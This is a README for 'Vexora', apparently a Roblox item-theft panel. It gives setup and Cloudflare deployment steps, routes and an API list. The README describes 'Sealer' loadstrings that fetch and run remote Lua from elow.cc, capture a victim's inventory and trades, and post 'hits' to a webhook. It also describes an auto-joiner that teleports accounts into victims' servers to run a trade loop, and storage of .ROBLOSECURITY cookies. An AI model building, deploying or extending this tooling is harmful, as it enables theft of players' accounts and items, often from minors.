# Vexora

Live capture dashboard: hit feed, stats and charts, server list, leaderboard, per-account
script config, an auto-joiner and an admin suite. Zero-dependency Node backend, vanilla
ES-module frontend. No build step, no npm install.

![Vexora](public/assets/share.png)

## Requirements

- Node.js 20 or newer for the local build
- A Cloudflare account for the Workers build (no other service needed)

## Run it

```bash
git clone <your-repo-url> vexora
cd vexora
node server/server.js
```

Open <http://127.0.0.1:5175/overview>.

The first account you register becomes the admin. Everyone after that is a member and can
be promoted from **Admin → Members**. Sign-in is username + password only; Discord is
optional.

A fresh Node database is seeded with demo members and hits so the charts have data. For a
clean install:

```bash
SEED=0 node server/server.js
```

The Workers build always starts empty — first account registered on `/overview` becomes the
admin, then the dashboard fills up from your own hits.

State lives in `data/db.json` and is written atomically. Delete the file to start over.

## Configuration

Copy `.env.example` to `.env` if you want to keep the values in a file, or pass them inline.
The server reads `process.env` directly, so any process manager works.

| Variable | Default | What it does |
| --- | --- | --- |
| `PORT` | `5175` | HTTP port |
| `HOST` | `127.0.0.1` | Bind address. Use `0.0.0.0` to accept LAN devices |
| `PUBLIC_URL` | derived | Public origin baked into loadstring URLs, e.g. `https://elow.cc` |
| `DISCORD_CLIENT_ID` | unset | Enables the optional Discord sign-in button |
| `DISCORD_CLIENT_SECRET` | unset | Discord OAuth secret |
| `SEED` | enabled | `SEED=0` creates an empty database instead of the demo seed |

Set `PUBLIC_URL` to the exact origin users hit. Every generated Roblox script points at it.

## Deploy on Cloudflare (elow.cc)

The repo ships a Workers build next to the Node one. `wrangler.jsonc` is the whole deploy
config: static SPA from `public/`, API in a Durable Object, state in its SQLite storage.
Nothing to provision and no database ID to paste.

```bash
npx wrangler login
npx wrangler deploy
```

Then in the Cloudflare dashboard open the Worker → **Settings → Domains & Routes** and add
`elow.cc`. `wrangler.jsonc` already sets `PUBLIC_URL` to `https://elow.cc`, so loadstrings and
redirects point at the domain as soon as it is attached.

A push build works too: set the deploy command to `npx wrangler deploy` and it will pick up
`wrangler.jsonc` from the repo root.

**What runs where**

| Piece | Node build | Workers build |
| --- | --- | --- |
| Dashboard, auth, hits, admin | `server/server.js` | `worker/index.js` → Durable Object |
| Storage | `data/db.json` | DO SQLite (survives deploys) |
| Passwords | scrypt | PBKDF2-SHA256 |
| Lua sealer + claimer | yes | yes |
| Desktop "launch Roblox" engine | yes | no (no local client) — card hidden |
| Discord sign-in | if env set | if vars/secrets set |

Sessions are httpOnly cookies either way; behind Cloudflare the login throttle reads
`CF-Connecting-IP` and cookies get `Secure`.

### Alternative: Cloudflare Tunnel + Node

If you would rather keep the Node build on a box you control, put a Tunnel in front of it —
the origin stays private, Cloudflare terminates TLS, and `https://elow.cc` works with no open
ports.

On the machine that runs Vexora:

```bash
# 1. start the app on loopback, advertising the public origin
PUBLIC_URL=https://elow.cc HOST=127.0.0.1 node server/server.js

# 2. install cloudflared (Debian/Ubuntu shown; see Cloudflare docs for Windows)
curl -fsSL https://pkg.cloudflare.com/cloudflare-main.gpg \
  | tee /usr/share/keyrings/cloudflare-main.gpg >/dev/null
echo "deb [signed-by=/usr/share/keyrings/cloudflare-main.gpg] https://pkg.cloudflare.com/cloudflared any main" \
  | tee /etc/apt/sources.list.d/cloudflared.list
apt-get update && apt-get install -y cloudflared

# 3. create the tunnel and point DNS at it
cloudflared tunnel login
cloudflared tunnel create vexora
cloudflared tunnel route dns vexora elow.cc
```

Then use the config in [`deploy/cloudflared.yml.example`](deploy/cloudflared.yml.example):

```bash
sudo mkdir -p /etc/cloudflared
sudo cp deploy/cloudflared.yml.example /etc/cloudflared/config.yml
# edit the tunnel id + credentials path inside, then:
sudo cloudflared service install
sudo systemctl enable --now cloudflared
```

Verify with `curl -I https://elow.cc/health`. It should return `200`.

**Windows instead of Linux:** run the same app with
`$env:PUBLIC_URL="https://elow.cc"` and use `cloudflared tunnel run --url http://127.0.0.1:5175`
for a quick test, or install it as a service with `cloudflared service install`.

Keep Vexora running under a supervisor. A systemd unit is included at
[`deploy/vexora.service`](deploy/vexora.service).

## Roblox scripts

Both scripts are served per account and baked with that account's token — never publish your
own generated URLs.

- **Sealer** (`/script`): `loadstring(game:HttpGet("https://elow.cc/raw/<token>.lua"))()`
  captures inventory and trades, and posts hits to your webhook token.
- **Auto joiner / claimer** (`/claimer`): `loadstring(game:HttpGet("https://elow.cc/raw/<token>-claimer.lua"))()`
  polls with your API key, teleports into flagged servers and starts the trade loop.

The **API key** is on `/script` and `/settings`. It is sent as `x-api-key` to
`/api/claimer/*`; rotate it there if it leaks. API keys, webhook tokens and cookies are stored
in `data/db.json` — that file is git-ignored on purpose.

### Auto joiner

Open **Auto joiner** in the sidebar:

1. Turn on **Armed**.
2. Optionally enable **Turn on automatically** so the first real hit arms it.
3. Copy the claimer loadstring into the always-on device's executor (autoexec folder so it
   survives teleports).
4. If the device is an Android emulator, set **Phone API base** to `http://10.0.2.2:5175`
   (local) or your public origin.

Only captures from a real victim with a live `game.JobId` become targets. Inventory dumps,
self-tests and stale servers are ignored, and anything older than 15 minutes shows as `stale`.

## Routes

| Path | What it does |
| --- | --- |
| `/overview` | Stat cards, activity charts, game split, live feed |
| `/hits` | Your captures — search, sort, timeframe, CSV export |
| `/public-hits` | Anonymized network stream (admin) |
| `/servers` | Reported servers with join links |
| `/leaderboard` | Rank by tracked value (admin) |
| `/script` | Loadstring, receivers, webhook, dualhook, min value, API key |
| `/claimer` | Auto joiner: latest hits, queue, accounts, SSS claimer script |
| `/settings` | Profile, password, API key, export/clear |
| `/admin/members` | Search, ban, promote |
| `/admin/hits` | Every hit network-wide |
| `/admin/blacklist` | Blocked Roblox usernames |
| `/admin/system` | Uptime, DB size, counts, OAuth status |

## API

```
GET    /api/me
GET    /api/stats
GET    /api/hits
GET    /api/hits/public
GET    /api/servers
GET    /api/leaderboard
GET    /api/config                PUT  /api/config
POST   /api/config/test
GET    /api/public/stream         (SSE)

GET    /api/claimer               PUT  /api/claimer
POST   /api/claimer/accounts      DELETE /api/claimer/accounts/:id
POST   /api/claimer/accounts/:id/verify
POST   /api/claimer/hits/:id/join
POST   /api/claimer/jobs/:id/join DELETE /api/claimer/jobs/:id
POST   /api/claimer/queue/clear

GET    /api/claimer/target        x-api-key
POST   /api/claimer/target/:id/arrived  x-api-key
POST   /api/claimer/heartbeat     x-api-key

POST   /api/webhooks/:token       (sealer ingest)
GET    /raw/:token.lua            (sealer script)
GET    /raw/:token-claimer.lua    (claimer script)
GET    /health
```

## Layout

```
server/server.js   Node bootstrap: env, store, claimer engine, listen
server/app.js      shared router: routes, auth, JSON API, SSE
server/db.js       JSON store for the Node build
server/claimer.js  claim queue, desktop launcher, Roblox lookups
public/            SPA, assets, CSS, Lua templates
worker/index.js    Workers entry: API to the Durable Object, else assets
worker/durable.js  DO wrapper around server/app.js
worker/store.js    DO SQLite store (same API as db.js)
worker/passwords.js PBKDF2 hashing for the cloud build
worker/shim.js     Request/response adapters
worker/claimer.js  cloud claim queue (no desktop launcher)
wrangler.jsonc     Cloudflare deploy config
data/db.json       Node runtime database (git-ignored)
deploy/            Tunnel + systemd examples
```

## Security notes

- `data/db.json` holds password hashes, session hashes, API keys, webhook tokens and any
  stored `.ROBLOSECURITY` cookies. Never commit it; the repo ships an empty `data/` instead.
- Session cookies are `HttpOnly`, `SameSite=Lax`, and `Secure` behind HTTPS.
- Login throttling keys off `CF-Connecting-IP` / `X-Forwarded-For`, so Cloudflare users are
  limited individually rather than sharing one bucket.
- Put the app behind HTTPS. A tunnel does that for you; exposing port 5175 directly does not.
